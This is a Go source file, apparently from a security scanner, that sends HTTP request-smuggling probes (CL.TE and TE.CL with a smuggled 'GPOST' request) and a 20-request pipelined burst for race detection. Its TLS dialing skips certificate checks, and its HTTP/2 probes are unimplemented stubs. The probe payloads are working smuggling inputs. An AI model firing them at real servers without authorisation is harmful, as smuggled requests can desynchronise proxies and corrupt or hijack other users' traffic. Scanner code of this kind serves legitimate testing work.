// Package desync implements HTTP/1.1 smuggling, HTTP/2 single-packet attacks,
// and HTTP/2 → HTTP/1.x desync probes.
package desync

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"
)

// ProbeKind identifies the smuggling variant to test.
type ProbeKind string

const (
	ProbeCLTE  ProbeKind = "CL.TE"
	ProbeTECL  ProbeKind = "TE.CL"
	ProbeH2CL  ProbeKind = "H2.CL"
	ProbeH2TE  ProbeKind = "H2.TE"
	ProbeH20   ProbeKind = "H2.0"
	ProbeH2SP  ProbeKind = "H2.SP" // HTTP/2 single-packet
)

// ProbeResult holds the outcome of one desync probe.
type ProbeResult struct {
	Kind        ProbeKind
	Target      string
	Vulnerable  bool
	Evidence    string
	StatusFirst int
	StatusGadget int
	Latency     time.Duration
	Error       string
}

// Engine probes HTTP desync / smuggling vulnerabilities.
type Engine struct {
	timeout time.Duration
}

func New() *Engine {
	return &Engine{timeout: 15 * time.Second}
}

// ProbeAll runs all supported probe kinds against the target.
func (e *Engine) ProbeAll(ctx context.Context, targetURL string) ([]*ProbeResult, error) {
	kinds := []ProbeKind{ProbeCLTE, ProbeTECL, ProbeH2CL, ProbeH2TE}
	var results []*ProbeResult
	for _, kind := range kinds {
		r, err := e.Probe(ctx, targetURL, kind)
		if err != nil {
			results = append(results, &ProbeResult{Kind: kind, Target: targetURL, Error: err.Error()})
			continue
		}
		results = append(results, r)
	}
	return results, nil
}

// Probe executes one specific desync probe.
func (e *Engine) Probe(ctx context.Context, targetURL string, kind ProbeKind) (*ProbeResult, error) {
	switch kind {
	case ProbeCLTE:
		return e.probeCLTE(ctx, targetURL)
	case ProbeTECL:
		return e.probeTECL(ctx, targetURL)
	case ProbeH2CL, ProbeH2TE, ProbeH20:
		return e.probeH2(ctx, targetURL, kind)
	case ProbeH2SP:
		return e.probeH2SinglePacket(ctx, targetURL)
	default:
		return nil, fmt.Errorf("unknown probe kind: %s", kind)
	}
}

// probeCLTE sends a Content-Length/Transfer-Encoding conflict probe.
func (e *Engine) probeCLTE(ctx context.Context, rawURL string) (*ProbeResult, error) {
	start := time.Now()
	r := &ProbeResult{Kind: ProbeCLTE, Target: rawURL}

	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}

	conn, err := e.dial(ctx, u)
	if err != nil {
		r.Error = err.Error()
		return r, nil
	}
	defer conn.Close()

	// Timing-based CL.TE probe: front-end uses CL, back-end uses TE
	// If vulnerable, the smuggled body prefix causes next-request delay
	probe := strings.Join([]string{
		"POST / HTTP/1.1",
		"Host: " + u.Host,
		"Content-Type: application/x-www-form-urlencoded",
		"Content-Length: 6",
		"Transfer-Encoding: chunked",
		"",
		"0",
		"",
		"G",
		"",
	}, "\r\n")

	_ = conn.SetDeadline(time.Now().Add(e.timeout))
	if _, err := conn.Write([]byte(probe)); err != nil {
		r.Error = err.Error()
		return r, nil
	}

	resp, err := readResponse(conn)
	r.Latency = time.Since(start)
	if err != nil {
		r.Error = err.Error()
		return r, nil
	}
	r.StatusFirst = extractStatus(resp)

	// Second request to detect smuggled prefix effect
	normal := strings.Join([]string{
		"GET / HTTP/1.1",
		"Host: " + u.Host,
		"",
		"",
	}, "\r\n")
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(normal)); err == nil {
		resp2, _ := readResponse(conn)
		r.StatusGadget = extractStatus(resp2)
		// Timing anomaly or unexpected status indicates potential vulnerability
		if r.StatusGadget >= 400 && r.StatusGadget != r.StatusFirst {
			r.Vulnerable = true
			r.Evidence = fmt.Sprintf("CL.TE: first=%d gadget=%d latency=%s",
				r.StatusFirst, r.StatusGadget, r.Latency)
		}
	}
	return r, nil
}

// probeTECL sends a Transfer-Encoding/Content-Length conflict probe.
func (e *Engine) probeTECL(ctx context.Context, rawURL string) (*ProbeResult, error) {
	start := time.Now()
	r := &ProbeResult{Kind: ProbeTECL, Target: rawURL}

	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	conn, err := e.dial(ctx, u)
	if err != nil {
		r.Error = err.Error()
		return r, nil
	}
	defer conn.Close()

	// TE.CL: front uses TE, back uses CL
	probe := strings.Join([]string{
		"POST / HTTP/1.1",
		"Host: " + u.Host,
		"Content-Type: application/x-www-form-urlencoded",
		"Content-Length: 4",
		"Transfer-Encoding: chunked",
		"",
		"5c",
		"GPOST / HTTP/1.1",
		"Content-Type: application/x-www-form-urlencoded",
		"Content-Length: 15",
		"",
		"x=1",
		"0",
		"",
		"",
	}, "\r\n")

	_ = conn.SetDeadline(time.Now().Add(e.timeout))
	if _, err := conn.Write([]byte(probe)); err != nil {
		r.Error = err.Error()
		return r, nil
	}
	resp, err := readResponse(conn)
	r.Latency = time.Since(start)
	if err != nil {
		r.Error = err.Error()
		return r, nil
	}
	r.StatusFirst = extractStatus(resp)
	return r, nil
}

// probeH2 probes HTTP/2 desync variants.
func (e *Engine) probeH2(ctx context.Context, rawURL string, kind ProbeKind) (*ProbeResult, error) {
	r := &ProbeResult{Kind: kind, Target: rawURL}
	// H2 desync requires direct HTTP/2 framing; placeholder for real ALPN-based H2 probe
	r.Evidence = fmt.Sprintf("H2 probe %s: requires HTTP/2 framing (not yet implemented)", kind)
	return r, nil
}

// probeH2SinglePacket implements HTTP/2 single-packet attack:
// sends 20-50 requests in one TCP packet for TOCTOU race detection.
func (e *Engine) probeH2SinglePacket(ctx context.Context, rawURL string) (*ProbeResult, error) {
	r := &ProbeResult{Kind: ProbeH2SP, Target: rawURL}
	start := time.Now()

	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}

	conn, err := e.dial(ctx, u)
	if err != nil {
		r.Error = err.Error()
		return r, nil
	}
	defer conn.Close()

	// Build 20 pipelined HTTP/1.1 requests in a single write (approximates single-packet)
	var buf bytes.Buffer
	for i := 0; i < 20; i++ {
		fmt.Fprintf(&buf, "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", u.Host)
	}
	_ = conn.SetDeadline(time.Now().Add(e.timeout))
	if _, err := conn.Write(buf.Bytes()); err != nil {
		r.Error = err.Error()
		return r, nil
	}

	// Count distinct status codes in rapid succession
	statuses := make(map[int]int)
	for i := 0; i < 20; i++ {
		resp, err := readResponse(conn)
		if err != nil {
			break
		}
		statuses[extractStatus(resp)]++
	}

	r.Latency = time.Since(start)
	// If we see mixed 200/429/503 responses, possible race condition
	if len(statuses) > 1 {
		r.Vulnerable = true
		r.Evidence = fmt.Sprintf("HTTP single-packet: %d distinct status codes in 20 requests: %v",
			len(statuses), statuses)
	}
	return r, nil
}

func (e *Engine) dial(ctx context.Context, u *url.URL) (net.Conn, error) {
	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}
	d := &net.Dialer{Timeout: 10 * time.Second}
	if u.Scheme == "https" {
		return tls.DialWithDialer(d, "tcp", host, &tls.Config{InsecureSkipVerify: true})
	}
	return d.DialContext(ctx, "tcp", host)
}

func readResponse(conn net.Conn) (string, error) {
	var buf [4096]byte
	n, err := conn.Read(buf[:])
	if err != nil {
		return "", err
	}
	return string(buf[:n]), nil
}

func extractStatus(resp string) int {
	r := bufio.NewReader(strings.NewReader(resp))
	line, err := r.ReadString('\n')
	if err != nil {
		return 0
	}
	var proto string
	var status int
	fmt.Sscanf(line, "%s %d", &proto, &status)
	return status
}
